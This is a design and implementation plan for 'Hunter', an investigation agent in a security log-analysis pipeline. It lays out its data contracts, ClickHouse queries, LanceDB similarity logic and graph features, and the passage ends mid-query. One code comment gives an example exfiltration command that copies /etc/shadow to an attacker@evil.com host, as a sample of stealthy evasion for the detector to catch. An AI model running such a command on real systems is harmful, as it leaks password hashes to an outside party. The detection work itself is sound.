# Hunter Agent — Production Implementation Plan (Corrected)
### CLIF — Cognitive Log Investigation Framework
**Version:** 6.0 | **Status:** Implementation Ready | **Target:** Phase 4
**Corrections:** All 10 V2 issues + 9 V3→V4 + 7 V4→V5 (LanceDB) + 4 V5→V6 (training/drift/graph/MITRE) corrections resolved against live pipeline (March 2026)

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Pipeline Position & Data Contract](#pipeline-position--data-contract)
3. [Architecture: What Changes from the Stub](#architecture-what-changes-from-the-stub)
4. [Investigation Pipeline — Redesigned](#investigation-pipeline--redesigned)
   - L1: Parallel Context Assembly
   - L2: Parallel Intelligence Layer
   - RAG Narrative Builder6
5. [The Graph Problem — SQL vs GNN Decision](#the-graph-problem--sql-vs-gnn-decision)
6. [Scoring Engine — Two-Phase Strategy](#scoring-engine--two-phase-strategy)
7. [Self-Supervised Training — Fixing Label Quality](#self-supervised-training--fixing-label-quality)
8. [Drift Detection](#drift-detection)
9. [Infrastructure & Performance](#infrastructure--performance)
10. [Output Contract & Downstream Integration](#output-contract--downstream-integration)
11. [Schema Migrations](#schema-migrations)
12. [Implementation Phases](#implementation-phases)
13. [File Layout](#file-layout)
14. [Risk Register](#risk-register)
15. [Compatibility Notes — V2 → V3 Changes](#compatibility-notes--v2--v3-changes)

---

## 1. Executive Summary

Hunter is the **second agent** in the CLIF pipeline. It receives high-confidence suspicious signals from Triage and performs deep contextual investigation before handing a structured finding to the Verifier.

The current stub is an empty Dockerfile. This document defines how to build it properly — with maximum accuracy, production-grade speed, and full compatibility with the existing CLIF stack (Redpanda, ClickHouse, LanceDB).

**Core principles driving every decision here:**
- **No new infrastructure.** Hunter must run in the existing Docker stack (CPU only, 4GB RAM limit).
- **Speed from parallelism, not from cutting corners.** All slow IO (ClickHouse queries, LanceDB HTTP) runs in parallel.
- **Accuracy from label quality first, model complexity second.** A well-trained CatBoost beats a poorly-trained GNN every time.
- **GNN is Phase 5.** The SQL graph approach is intentional for Phase 4. GNN gets added once Verifier is providing clean labels.
- **Zero phantom fields.** Every field referenced in this plan has been verified against the actual source code.

**V3 Corrections Summary (10 issues fixed):**
1. Input schema aligned to actual `TriageResult` dataclass (26 fields, no phantom fields)
2. Raw features removed from input (Triage does not publish them to Kafka)
3. Output schema aligned to consumer's `_build_hunter_investigation_row()` (17 fields)
4. Feature vector redesigned from 42-dim to 33-dim (only derivable features) — later expanded to 36-dim in V5
5. All SQL queries verified against actual ClickHouse column names and types
6. Port changed from 8200 (Merkle conflict) to 8400
7. Two new tables added as schema migrations (`hunter_training_data`, `hunter_model_health`)
8. `triage_scores` queries no longer reference non-existent `dst_ip`/`dst_port`/`dst_bytes`
9. Process event queries use `binary_path`/`arguments`/`pid`/`ppid` (not phantom `process_name`/`parent_process`)
10. Narrative field kept per design intent — consumer compatibility note documented

**V4 Corrections Summary (9 additional issues fixed against live pipeline):**
1. **Input topic changed:** `triage-scores` → `hunter-tasks` — Triage already publishes escalated events to dedicated `hunter-tasks` topic (app.py lines 808-816). No need to filter ALL triage scores.
2. **Filter logic simplified:** `action='escalate'` check removed (redundant — all `hunter-tasks` messages are already escalated). Only `adjusted_score > 0.65` threshold remains.
3. **`agents/hunter/` does not exist:** V3 claimed an empty Dockerfile stub exists. Actually, the directory doesn't exist at all — must be created from scratch.
4. **Port 8200 is NOT taken by Merkle:** Merkle service has no HTTP API port. Port 8200 is free. Hunter still uses 8400 for clarity.
5. **LanceDB is profile-gated:** LanceDB service requires `docker compose --profile full up` to run. Hunter MUST have graceful fallback when LanceDB is unavailable.
6. **~~4th LanceDB table available:~~ V5: `attack_embeddings` replaces `security_embeddings`.** The `security_embeddings` table referenced in V4 was never created by LanceDB service. Replaced with `attack_embeddings` — stores ONLY confirmed attacks/escalated events. See V5 corrections.
7. **narrative→summary resolved:** Hunter publishes field as `summary` (matching consumer's `msg.get("summary")`) — no consumer fix needed.
8. **Triage publishes to 3 topics on escalate:** `triage-scores` (always) + `anomaly-alerts` + `hunter-tasks` (on escalate). V3 pipeline diagram was incomplete.
9. **Triage ports 8300-8303:** 4 triage agent instances use ports 8300, 8301, 8302, 8303 — not just 8300.

**V6 Corrections Summary (4 logic flaws fixed — training labels, drift baseline, graph amplification, MITRE blind spot):**
1. **Pseudo-negative label void fixed:** Original `build_training_set()` queried `hunter_training_data JOIN triage_scores WHERE action='discard'`. Discarded events are NEVER written to `hunter_training_data` (only escalated events are investigated), so this JOIN always returned zero rows — CatBoost would train on 100% positives. Fixed by pulling pseudo-negatives from `hunter_training_data JOIN hunter_investigations WHERE severity IN ('info','low') AND confidence < 0.30 AND finding_type NOT IN (dangerous types)`. Both tables exist, both are populated by Hunter's own pipeline.
2. **Drift baseline uses own drifted output fixed:** `check_score_drift()` compared last-1h vs last-24h of Hunter's confidence — both windows drift together during gradual model degradation, so KL divergence stays low. Fixed: (a) stable baseline uses 7-day-to-1-day window predating recent changes; (b) Triage-anchored divergence check added — measures `avg(abs(confidence - trigger_score))` from `hunter_investigations` where `trigger_score` = Triage's original score (an independent anchor). Bias direction (over-alerting vs. under-alerting) also logged.
3. **Graph escalation amplification fixed:** Query 4 counted all escalations for neighbor IPs without any cap. A noisy scanner or shared corporate proxy with 100+ escalations would inflate the `graph_neighbor_escalate_rate` for ALL hosts that ever communicated with it. Fixed: `HAVING escalation_count <= 50 OR has_ioc = 1` caps noisy IPs (IOC-confirmed malicious IPs bypass the cap). Recency columns (`recent_6h`, `recent_24h`) added. Rate now computed from 24h-recent escalators only.
4. **MITRE trigger features hardcoded to 0 fixed:** `build_feature_context()` had 3 features hardcoded as `0`: `template_user_created`, `off_hours`, `template_priv_escalation`. Any MITRE rule using only these trigger_features would silently never fire. Fixed: `off_hours` derived from `triage_msg["timestamp"]` (ISO-8601 UTC hour check); `template_user_created` derived by keyword-matching `template_id` (useradd, adduser, etc.); `template_priv_escalation` derived by keyword-matching `template_id` (sudo, escalat, etc.). `validate_mitre_rules()` added to log startup warnings for any rule with unknown trigger features.

**V5 Corrections Summary (LanceDB architectural redesign — critical semantic search flaw fixed):**
1. **`security_embeddings` → `attack_embeddings`:** The `security_embeddings` table referenced in V4 is NOT created by `lancedb-service/app.py`'s `_ensure_tables()` method. Replaced with `attack_embeddings` — a new table that stores ONLY confirmed attacks/escalated events (from `triage_scores WHERE action='escalate'`, `security_events WHERE severity >= 5`, and `feedback_labels WHERE label='true_positive'`). This solves the normal-neighbor contamination problem.
2. **CRITICAL FIX — LanceDB similarity to normal events must NEVER override Triage verdict:** V4 treated LanceDB similarity as a direct feature input. If an escalated event's nearest neighbors in `log_embeddings` were all normal (severity=0), the similarity features would push Hunter toward "benign" — directly contradicting Triage's ML-based escalation. V5 introduces a multi-signal decision matrix that interprets low-distance-to-normal as EITHER a false positive OR a stealth/evasion attack, resolved by cross-referencing Triage's `eif_score` and `template_rarity`.
3. **Similarity features expanded:** 4 → 7 features. Added `similarity_attack_distance` (distance to nearest known attack), `similarity_novelty_flag` (1 if no close match in attack_embeddings), `similarity_evasion_flag` (1 if textually normal but statistically anomalous).
4. **Feature vector expanded:** 33-dim → 36-dim to accommodate 3 new similarity features.
5. **New finding types:** Added `novel_anomaly` (no match in attack_embeddings, high EIF) and `evasion_technique` (close to normal logs but statistically anomalous — MITRE T1036).
6. **Narrative builder updated:** Adds context-aware framing for novel anomalies and stealth attacks instead of generic similarity reporting.
7. **LanceDB is a CONTEXT PROVIDER, never a DECISION MAKER:** This is now an architectural rule. Hunter uses LanceDB to classify WHAT KIND of attack, not WHETHER it's an attack. Triage's ML scores are the ground truth for anomaly detection.

---

## 2. Pipeline Position & Data Contract

### Where Hunter Lives

```
Triage Agent
    ↓ publishes to: triage-scores (Kafka topic) — ALL scored events
    ↓ publishes: asdict(TriageResult) — 26 fields, every scored event
    ↓ on escalate, ALSO publishes to: anomaly-alerts AND hunter-tasks
    ↓ hunter-tasks payload = same asdict(TriageResult), pre-filtered to escalated only

Hunter Agent
    ↓ consumes from: hunter-tasks (consumer group: hunter-agent)
    ↓ filters: adjusted_score > 0.65 (action='escalate' is guaranteed by topic)
    ↓ publishes to: hunter-results (Kafka topic, 6 partitions)
    ↓ writes to: hunter_investigations (ClickHouse, via consumer)
    ↓ writes to: hunter_training_data (ClickHouse, direct)

Verifier Agent (Phase 5)
    ↓ consumes from: hunter-results
```

### Input Message Schema (from Triage)

Hunter consumes the `hunter-tasks` topic. Each message is `asdict(TriageResult)`, a JSON blob with exactly these 26 fields — verified against `agents/triage/score_fusion.py` line 42. All messages on this topic have `action='escalate'` (pre-filtered by Triage at `app.py` lines 808-816).

> **V4 change:** V3 consumed from `triage-scores` (all events, ~82K EPS). Now consumes from `hunter-tasks` (escalated-only, ~5-15% of traffic). This eliminates ~85-95% of unnecessary deserialization and filtering.

```python
# TriageResult dataclass — exact field order from score_fusion.py
@dataclass
class TriageResult:
    event_id: str                # original event UUID
    timestamp: str               # ISO-8601
    source_type: str             # e.g., "syslog", "windows", "network"
    hostname: str                # source host
    source_ip: str               # String (may be empty)
    user_id: str                 # user identifier
    template_id: str             # Drain3 template cluster ID
    template_rarity: float       # 0.0-1.0 (lower = rarer)
    combined_score: float        # weighted fusion: lgbm*w1 + eif*w2 + arf*w3
    lgbm_score: float            # LightGBM ONNX score
    eif_score: float             # Extended Isolation Forest score
    arf_score: float             # River ARF score
    score_std_dev: float         # std(lgbm, eif, arf)
    agreement: float             # 1 - score_std_dev
    ci_lower: float              # 95% CI lower bound
    ci_upper: float              # 95% CI upper bound
    asset_multiplier: float      # from asset_criticality table
    adjusted_score: float        # (combined + boosts) * asset_multiplier
    action: str                  # 'discard' | 'monitor' | 'escalate'
    ioc_match: int               # 0 or 1
    ioc_confidence: int          # 0-100
    mitre_tactic: str            # single tactic string (may be empty)
    mitre_technique: str         # single technique string (may be empty)
    features_stale: int          # 0 or 1
    model_version: str           # e.g., "v1.0.0"
    disagreement_flag: int       # 0 or 1
```

**What is NOT in the message (removed from V2 plan):**
- ~~`dst_ip`~~ — does not exist in TriageResult
- ~~`dst_port`~~ — does not exist in TriageResult
- ~~`dst_bytes`~~ — does not exist in TriageResult
- ~~`midas_burst_score`~~ — does not exist in TriageResult
- ~~`source_threshold`~~ — does not exist in TriageResult
- ~~`log_template`~~ — does not exist in TriageResult
- ~~`summary`~~ — does not exist in TriageResult
- ~~`allowlisted`~~ — does not exist in TriageResult
- ~~`Raw feature dict (20)`~~ — Triage computes features internally and does NOT serialize them to Kafka. Hunter cannot access raw features without modifying Triage.

**Filter logic — Hunter only processes:**
```python
# All messages on hunter-tasks already have action='escalate'
# Only the score threshold gate is needed
msg.get("adjusted_score", 0) > 0.65
```

> **V4 change:** The `action='escalate'` check was removed — it's guaranteed by the `hunter-tasks` topic contract. Only the score threshold remains.

Everything below that threshold stays in ClickHouse for Triage-level analysis only.

### Output Message Schema (to hunter-results topic)

This schema is aligned to what the consumer's `_build_hunter_investigation_row()` function (consumer/app.py line 394) extracts. The consumer maps `hunter-results` → `hunter_investigations` table.

```json
{
  "alert_id": "uuid-v4 (new, generated by Hunter)",
  "started_at": "2026-01-15T14:30:00.000Z",
  "completed_at": "2026-01-15T14:30:00.178Z",
  "status": "completed",
  "hostname": "web-server-01",
  "source_ip": "192.168.1.50",
  "user_id": "jdoe",
  "trigger_score": 0.82,
  "severity": "high",
  "finding_type": "ioc_correlation",
  "summary": "Investigation of 192.168.1.50 ...",
  "evidence_json": "{\"event_id\":\"original-triage-uuid\",\"temporal\":{...},\"graph\":{...},\"similarity\":{...},\"mitre\":{...},\"campaign\":{...},\"scorer_mode\":\"heuristic\",\"investigation_ms\":178}",
  "correlated_events": ["uuid-1", "uuid-2"],
  "mitre_tactics": ["Initial Access", "Lateral Movement"],
  "mitre_techniques": ["T1078", "T1021"],
  "recommended_action": "escalate",
  "confidence": 0.87
}
```

**Field-by-field alignment with consumer:**

| Hunter publishes | Consumer extracts | ClickHouse column | Type | Notes |
|---|---|---|---|---|
| `alert_id` | `msg.get("alert_id")` | `alert_id UUID` | UUID string | New UUID per investigation |
| `started_at` | `msg.get("started_at")` | `started_at DateTime64(3)` | ISO-8601 | Time investigation began |
| `completed_at` | `msg.get("completed_at")` | `completed_at Nullable(DateTime64(3))` | ISO-8601 or null | Time investigation ended |
| `status` | `msg.get("status")` | `status Enum8` | `"completed"` or `"failed"` | Values 2 or 3 in Enum |
| `hostname` | `msg.get("hostname")` | `hostname String` | string | From Triage input |
| `source_ip` | `msg.get("source_ip")` | `source_ip String` | string | From Triage input |
| `user_id` | `msg.get("user_id")` | `user_id String` | string | From Triage input |
| `trigger_score` | `msg.get("trigger_score")` | `trigger_score Float32` | float | = Triage's `adjusted_score` |
| `severity` | `msg.get("severity")` | `severity Enum8` | `"info"\|"low"\|"medium"\|"high"\|"critical"` | Values 0-4 |
| `finding_type` | `msg.get("finding_type")` | `finding_type LowCardinality(String)` | free string | NOT Enum |
| `summary` | `msg.get("summary")` | `summary String` | string | **V4 fix: publish as `summary` directly — no consumer change needed** |
| `evidence_json` | `msg.get("evidence_json")` | `evidence_json String` | JSON string | Serialized investigation data |
| `correlated_events` | `msg.get("correlated_events")` | `correlated_events Array(UUID)` | list of UUID strings | Consumer validates UUID format |
| `mitre_tactics` | `msg.get("mitre_tactics")` | `mitre_tactics Array(String)` | list of strings | |
| `mitre_techniques` | `msg.get("mitre_techniques")` | `mitre_techniques Array(String)` | list of strings | |
| `recommended_action` | `msg.get("recommended_action")` | `recommended_action String` | free string | NOT Enum |
| `confidence` | `msg.get("confidence")` | `confidence Float32` | float 0.0-1.0 | Hunter's final confidence |

**Compatibility Note 1 — narrative vs summary (RESOLVED in V4):**
The consumer calls `msg.get("summary")` to populate the `summary` column. **V4 fix:** Hunter now publishes the investigation narrative under the key `summary` (not `narrative`), matching the consumer's expectation exactly. No consumer code change is needed.

**Fields stored in `evidence_json` (not top-level):**
- `event_id` — the original Triage event UUID (for traceability)
- `scorer_mode` — `"heuristic"` or `"catboost"`
- `investigation_ms` — investigation duration in milliseconds
- `temporal`, `graph`, `similarity`, `mitre`, `campaign` — per-step evidence objects

**Note:** The `shap_top_features` and `shap_summary` columns exist in the `triage_scores` ClickHouse table but are NOT populated by the Triage agent (the `TriageResult` dataclass does not have these fields). They are reserved for a future async SHAP worker. Hunter should not depend on them.

---

## 3. Architecture: What Changes from the Stub

### Current State
```
agents/hunter/
    (directory does not exist — must be created from scratch)
```

> **V4 correction:** V3 stated an empty Dockerfile stub existed. In the live pipeline, `agents/hunter/` has never been created. Only `agents/triage/` and `agents/Data/` exist.

### Target State
```
agents/hunter/
    app.py                  ← ~900 lines, TriageConsumer + HunterAgent + Flask
    config.py               ← all env vars, thresholds, topic names
    investigation/
        __init__.py
        temporal_correlator.py    ← ClickHouse ±10min window queries
        similarity_searcher.py    ← LanceDB 3-table HTTP client (V5: attack_embeddings + historical_incidents + log_embeddings)
        graph_builder.py          ← 2-hop SQL graph + 8 feature extraction
        mitre_mapper.py           ← rule-based ATT&CK mapper
        campaign_detector.py      ← multi-entity correlation
        rag_narrative.py          ← string assembly + severity logic
    scoring/
        __init__.py
        heuristic_scorer.py       ← weighted 8-component formula
        catboost_scorer.py        ← 36-feature CatBoost inference (V5: expanded from 33)
        scorer.py                 ← mode switcher + fallback logic
    training/
        __init__.py
        self_supervised_trainer.py ← 6hr background retraining loop
        label_builder.py           ← pseudo + verifier + analyst labels
        feature_store.py           ← hunter_training_data R/W
    monitoring/
        __init__.py
        drift_detector.py          ← KL divergence + PSI + staleness
    Dockerfile
    requirements.txt
    models/                   ← volume-mounted CatBoost artifact
```

---

## 4. Investigation Pipeline — Redesigned

### Overview

```
Kafka consume (hunter-tasks, group=hunter-agent)
        ↓
  Deserialize (orjson) + filter (adjusted_score > 0.65)
  [action='escalate' is guaranteed by hunter-tasks topic contract]
        ↓
  ┌─────────────────────────────────────────────┐
  │  L1 — ThreadPoolExecutor(max_workers=3)     │
  │                                             │
  │  Thread 1: Temporal Correlator              │
  │  Thread 2: Similarity Searcher              │
  │  Thread 3: Graph Builder                    │
  └──────────────┬──────────────────────────────┘
                 │ all 3 complete
  ┌──────────────▼──────────────────────────────┐
  │  L2 — ThreadPoolExecutor(max_workers=2)     │
  │                                             │
  │  Thread 1: MITRE Mapper                     │
  │  Thread 2: Campaign Detector                │
  └──────────────┬──────────────────────────────┘
                 │ both complete
  ┌──────────────▼──────────────────────────────┐
  │  RAG Narrative Builder                      │
  │  + Scoring Engine                           │
  └──────────────┬──────────────────────────────┘
                 ↓
  Publish to hunter-results (Kafka)
  → Consumer writes to hunter_investigations (ClickHouse)
  Direct write to hunter_training_data (ClickHouse)
```

### Why Two Layers?

L2 depends on L1 output:
- MITRE Mapper needs graph neighbor MITRE tags (from Graph Builder)
- Campaign Detector needs neighbor IPs (from Graph Builder) and correlated event context (from Temporal Correlator)

Running them before L1 completes produces garbage. So L2 waits for L1, but both L2 threads run in parallel with each other.

---

### L1 Thread 1: Temporal Correlator

**Purpose:** Find other events that happened near the same time involving the same entity.

**Three ClickHouse queries, verified against actual schema columns:**

```sql
-- Query 1: security_events in ±10min window
-- Columns verified: ip_address (IPv4), severity (UInt8), mitre_tactic, mitre_technique
SELECT toString(event_id) as eid,
       severity,
       mitre_tactic,
       mitre_technique,
       timestamp
FROM clif_logs.security_events
WHERE toString(ip_address) = %(source_ip)s
  AND timestamp BETWEEN toDateTime64(%(ts_start)s, 3) AND toDateTime64(%(ts_end)s, 3)
ORDER BY timestamp DESC
LIMIT 50
SETTINGS max_execution_time = 8
```

```sql
-- Query 2: network_events in ±10min window
-- Columns verified: src_ip (IPv4), dst_ip (IPv4), dst_port (UInt16), bytes_sent (UInt64)
SELECT toString(event_id) as eid,
       toString(dst_ip) as dst_ip,
       dst_port,
       bytes_sent,
       timestamp
FROM clif_logs.network_events
WHERE toString(src_ip) = %(source_ip)s
  AND timestamp BETWEEN toDateTime64(%(ts_start)s, 3) AND toDateTime64(%(ts_end)s, 3)
ORDER BY timestamp DESC
LIMIT 50
SETTINGS max_execution_time = 8
```

```sql
-- Query 3: process_events in ±10min window
-- Columns verified: binary_path (String), arguments (String), pid (UInt32), ppid (UInt32)
-- NOTE: V2 plan incorrectly used "process_name" and "parent_process" — these columns
--       do not exist. Correct columns are binary_path and ppid.
SELECT toString(event_id) as eid,
       binary_path,
       arguments,
       pid,
       ppid,
       timestamp
FROM clif_logs.process_events
WHERE hostname = %(hostname)s
  AND timestamp BETWEEN toDateTime64(%(ts_start)s, 3) AND toDateTime64(%(ts_end)s, 3)
ORDER BY timestamp DESC
LIMIT 50
SETTINGS max_execution_time = 8
```

**Hostname fallback:** If source_ip returns zero results from security_events and network_events, re-query using hostname (covers NAT scenarios where the IP is translated):

```sql
-- Fallback for security_events
WHERE hostname = %(hostname)s
  AND timestamp BETWEEN ...
```

**Output — 4 float features:**
```python
temporal_event_count        # total correlated events found across all 3 queries
temporal_high_sev_ratio     # fraction with severity >= 3 (high/critical) from security_events
temporal_unique_tactics     # count of distinct mitre_tactic values in window
temporal_recency_score      # fraction of events in last 60s vs full 10min window
```

**Expected latency:** 3 sequential ClickHouse queries × ~20ms each = ~60ms worst case.

---

### L1 Thread 2: Similarity Searcher (V5 — Redesigned)

**Purpose:** Classify WHAT KIND of anomaly this is, NOT whether it IS an anomaly. LanceDB is a **context provider, never a decision maker.** Triage's ML scores are the ground truth.

> **ARCHITECTURAL RULE (V5):** Hunter NEVER downgrades a Triage escalation based solely on LanceDB similarity to normal events. When LanceDB shows the escalated event is textually similar to normal logs, that is interpreted as EITHER a false positive (if EIF agrees it's normal) OR a stealth/evasion attack (if EIF says it's anomalous). The conflict between textual similarity and statistical anomaly is itself the strongest signal of defense evasion.

> **V4 note — LanceDB is profile-gated:** LanceDB runs only when Docker Compose is started with `--profile full`. Hunter MUST detect LanceDB unavailability and fall back to neutral similarity features. Use a 3-second connection timeout on first call; if it fails, skip all LanceDB calls for 60 seconds before retrying.

> **Available tables (4):** `log_embeddings` (all logs — context only), `attack_embeddings` (confirmed attacks/escalated events — NEW in V5), `threat_intel`, `historical_incidents`.

> **V5 critical change — `security_embeddings` → `attack_embeddings`:** V4 referenced `security_embeddings` but this table was never created by `lancedb-service/app.py`'s `_ensure_tables()`. Replaced with `attack_embeddings` containing ONLY confirmed attacks (events where `action='escalate'`, `severity >= 5`, or `feedback_label='true_positive'`). This eliminates normal-neighbor contamination.

**Three HTTP POST calls to LanceDB (port 8100), each serving a DISTINCT purpose:**

```python
# ── Search 1: attack_embeddings (V5 NEW) ─────────────────────────────────
# PURPOSE: "Does this match a KNOWN ATTACK pattern?"
# Contains ONLY confirmed attacks — a match here = known attack type.
# A miss here = novel (not necessarily benign).
attack_results = requests.post("http://lancedb:8100/search", json={
    "query": query_text,
    "table": "attack_embeddings",
    "limit": 5
}, timeout=5)

# ── Search 2: historical_incidents ────────────────────────────────────────
# PURPOSE: "Have we investigated something like this before?" (RAG context)
incident_results = requests.post("http://lancedb:8100/search", json={
    "query": f"{mitre_tactic} {mitre_technique} {template_id}",
    "table": "historical_incidents",
    "limit": 5
}, timeout=5)

# ── Search 3: log_embeddings ──────────────────────────────────────────────
# PURPOSE: Context ONLY — "What does this event textually resemble?"
# NEVER used for verdict. Only populates narrative context.
# This table contains normal + anomalous events mixed together.
context_results = requests.post("http://lancedb:8100/search", json={
    "query": query_text,
    "table": "log_embeddings",
    "limit": 5
}, timeout=5)
```

**Query construction — unchanged from V4:**

The embedding model (`all-MiniLM-L6-v2`) was trained on natural language, not network artifacts. IPs and port numbers are meaningless to it.

```python
def build_search_query(triage_msg: dict) -> str:
    """Build a semantic search query optimized for MiniLM-L6-v2."""
    parts = []

    # Template ID gives behavioral context
    template_id = triage_msg.get("template_id", "")
    if template_id:
        parts.append(f"template {template_id}")

    # MITRE context is natural language the model understands
    tactic = triage_msg.get("mitre_tactic", "")
    technique = triage_msg.get("mitre_technique", "")
    if tactic:
        parts.append(tactic)
    if technique:
        parts.append(technique)

    # Source type adds context
    source_type = triage_msg.get("source_type", "")
    if source_type:
        parts.append(f"{source_type} event")

    # IOC context
    if triage_msg.get("ioc_match"):
        parts.append("indicator of compromise threat")

    # Disagreement context
    if triage_msg.get("disagreement_flag"):
        parts.append("anomalous unusual behavior")

    return " ".join(parts) if parts else "suspicious security event"
```

**V5 Multi-Signal Decision Matrix — How Hunter interprets LanceDB results:**

The Hunter cross-references LanceDB distances with Triage's ML scores to classify the anomaly:

```python
def interpret_similarity(
    attack_results: list,      # from attack_embeddings
    context_results: list,     # from log_embeddings  
    incident_results: list,    # from historical_incidents
    triage_msg: dict           # original triage escalation
) -> SimilarityResult:
    """
    Multi-signal interpretation of LanceDB results.
    
    KEY PRINCIPLE: LanceDB encodes TEXTUAL similarity, not malicious intent.
    "buffer overflow exploit CVE-2026-XXXX" and "buffer overflow patch applied"
    are close in embedding space (~0.3) but have opposite security semantics.
    """
    eif_score = triage_msg.get("eif_score", 0.5)
    template_rarity = triage_msg.get("template_rarity", 0.5)
    disagreement = triage_msg.get("disagreement_flag", 0)
    
    # ── Extract distances ──
    attack_min_dist = min((r["_distance"] for r in attack_results), default=1.0)
    attack_mean_dist = (
        sum(r["_distance"] for r in attack_results) / len(attack_results)
        if attack_results else 1.0
    )
    context_min_dist = min((r["_distance"] for r in context_results), default=1.0)
    incident_min_dist = min((r["_distance"] for r in incident_results), default=1.0)
    incident_match = 1.0 if incident_min_dist < 0.5 else 0.0
    incident_severity = (
        max((r.get("severity", 0) for r in incident_results if r["_distance"] < 0.5), default=0) / 4.0
    )
    
    # ── Classify anomaly type ──
    novelty_flag = 0
    evasion_flag = 0
    
    # CASE 1: Known attack match (attack_embeddings hit)
    if attack_min_dist < 0.25:
        # Close match to a confirmed attack → known attack type
        novelty_flag = 0
        evasion_flag = 0
    
    # CASE 2: Novel anomaly (no attack match + statistical outlier)
    elif attack_min_dist >= 0.25 and eif_score >= 0.65:
        # Not similar to any known attack, but EIF says it's a statistical outlier.
        # This is a NOVEL anomaly — LanceDB correctly has no match because
        # nothing like this has been seen before.
        novelty_flag = 1
        evasion_flag = 0
    
    # CASE 3: Stealth/evasion attack (close to NORMAL logs but statistically anomalous)
    elif context_min_dist < 0.20 and eif_score >= 0.65:
        # Textually identical to normal operations (low distance to normal logs)
        # but Triage's EIF says it's a statistical outlier.
        # This SCREAMS defense evasion — attacker mimicking normal commands.
        # Example: "rsync -avz /etc/shadow attacker@evil.com:/loot/"
        #  vs     "rsync -avz /data/backups backup-srv:/archive/"
        novelty_flag = 0
        evasion_flag = 1
    
    # CASE 4: Potential false positive (close to normal + NOT a statistical outlier)
    elif context_min_dist < 0.20 and eif_score < 0.40:
        # Both textually normal AND statistically normal.
        # Triage may have over-escalated. Low confidence.
        novelty_flag = 0
        evasion_flag = 0
        # Note: Hunter still investigates but will produce low severity
    
    return SimilarityResult(
        min_distance=attack_min_dist,          # distance to nearest ATTACK (not any log)
        mean_distance=attack_mean_dist,        # avg distance in attack space
        incident_match=incident_match,         # 1 if historical incident matched
        incident_severity=incident_severity,   # severity of matched incident
        attack_distance=attack_min_dist,       # explicit attack-space distance
        novelty_flag=novelty_flag,             # 1 if novel (no known attack match)
        evasion_flag=evasion_flag,             # 1 if stealth (textually normal, statistically anomalous)
        context_min_distance=context_min_dist, # distance to nearest log (informational)
    )
```

**Output — 7 float features (V5 expanded from V4's 4):**
```python
similarity_min_distance         # _distance to closest ATTACK match (from attack_embeddings)
similarity_mean_distance        # average _distance across top-5 in attack_embeddings
similarity_incident_match       # 1.0 if any historical_incidents match with _distance < 0.5
similarity_incident_severity    # severity of matched historical incident (normalized 0-1, /4)
similarity_attack_distance      # explicit distance in attack embedding space (V5 NEW)
similarity_novelty_flag         # 1 if no close match in attack_embeddings + high EIF (V5 NEW)
similarity_evasion_flag         # 1 if textually normal but statistically anomalous (V5 NEW)
```

**Neutral fallback values (when LanceDB unavailable):**
```python
# When LanceDB is unreachable, use neutral values that don't bias the verdict:
similarity_min_distance    = 0.5   # uncertain
similarity_mean_distance   = 0.5   # uncertain
similarity_incident_match  = 0     # no match assumed
similarity_incident_severity = 0   # no severity
similarity_attack_distance = 0.5   # uncertain
similarity_novelty_flag    = 0     # don't assume novel
similarity_evasion_flag    = 0     # don't assume evasion
```

**Expected latency:** 3 parallel HTTP calls × ~25ms each = ~25-30ms (parallel via ThreadPoolExecutor or asyncio). If LanceDB is unavailable: 0ms (instant neutral fallback).

**V5 Scenario Reference (how the decision matrix handles edge cases):**

| Scenario | attack_embeddings | log_embeddings | EIF score | Hunter Classification |
|---|---|---|---|---|
| Known SQL injection | dist=0.08 (HIT) | dist=0.45 | 0.45 | `sql_injection` (from neighbor category) |
| Novel zero-day | dist>0.5 (MISS) | dist=0.31 to normal | 0.87 | `novel_anomaly` — trust Triage |
| Stealth exfil (rsync) | dist>0.5 (MISS) | dist=0.12 to normal! | 0.72 | `evasion_technique` — T1036 |
| True FP (cron job) | dist>0.5 (MISS) | dist=0.05 to normal | 0.32 | Low confidence, severity=info |

---

### L1 Thread 3: Graph Builder

**Purpose:** Map the network neighborhood of the suspicious entity, compute structural risk features.

**Five ClickHouse queries, all verified against `network_events` and `triage_scores` schemas:**

```sql
-- Query 1: Hop-1 outbound neighbors
-- network_events: src_ip (IPv4), dst_ip (IPv4), bytes_sent (UInt64)
SELECT toString(dst_ip) as peer_ip,
       count() as conn_count,
       sum(bytes_sent) as total_bytes,
       max(timestamp) as last_seen
FROM clif_logs.network_events
WHERE toString(src_ip) = %(source_ip)s
  AND timestamp > now() - INTERVAL 24 HOUR
GROUP BY peer_ip
ORDER BY conn_count DESC
LIMIT 20
SETTINGS max_execution_time = 8
```

```sql
-- Query 2: Hop-1 inbound neighbors
-- network_events: src_ip (IPv4), dst_ip (IPv4), bytes_received (UInt64)
SELECT toString(src_ip) as peer_ip,
       count() as conn_count,
       sum(bytes_received) as total_bytes,
       max(timestamp) as last_seen
FROM clif_logs.network_events
WHERE toString(dst_ip) = %(source_ip)s
  AND timestamp > now() - INTERVAL 24 HOUR
GROUP BY peer_ip
ORDER BY conn_count DESC
LIMIT 20
SETTINGS max_execution_time = 8
```

```sql
-- Query 3: Port diversity + bytes baseline
-- Used for graph_unique_dst_ports and bytes z-score computation
SELECT count(DISTINCT dst_port) as unique_dst_ports,
       sum(bytes_sent) as total_bytes_24h,
       count() as total_connections
FROM clif_logs.network_events
WHERE toString(src_ip) = %(source_ip)s
  AND timestamp > now() - INTERVAL 24 HOUR
SETTINGS max_execution_time = 8
```

```sql
-- Query 4: Escalation context for neighbor IPs
-- triage_scores: source_ip (String), action (Enum8), adjusted_score (Float32),
--                mitre_tactic (String), ioc_match (UInt8)
-- NOTE: triage_scores does NOT have dst_ip, dst_port, or dst_bytes columns.
--       V2 plan incorrectly referenced those. Fixed here.
--
-- V6 FIX — Noisy IP amplification prevention:
--   Original query counted ALL escalations equally. A shared corporate proxy or
--   a noisy scanner with 100+ escalations would make every host that talked to it
--   appear high-risk, propagating false reputation across the graph indefinitely.
--
--   FIX 1: HAVING clause caps IPs with >50 escalations in 48h UNLESS they have an IOC
--           match (genuine malicious IPs can have high counts; noisy infra usually lacks IOC).
--   FIX 2: Add recency columns (recent_6h, recent_24h) to weight escalations by time.
--           A neighbor with 2 escalations in the last 6h is MORE threatening than one
--           with 48 old escalations.
SELECT source_ip,
       count()                                              AS escalation_count,
       max(adjusted_score)                                  AS max_score,
       groupArray(mitre_tactic)                             AS tactics,
       max(ioc_match)                                       AS has_ioc,
       countIf(timestamp > now() - INTERVAL 6 HOUR)        AS recent_6h,
       countIf(timestamp > now() - INTERVAL 24 HOUR)       AS recent_24h
FROM clif_logs.triage_scores
WHERE source_ip IN %(neighbor_ips)s
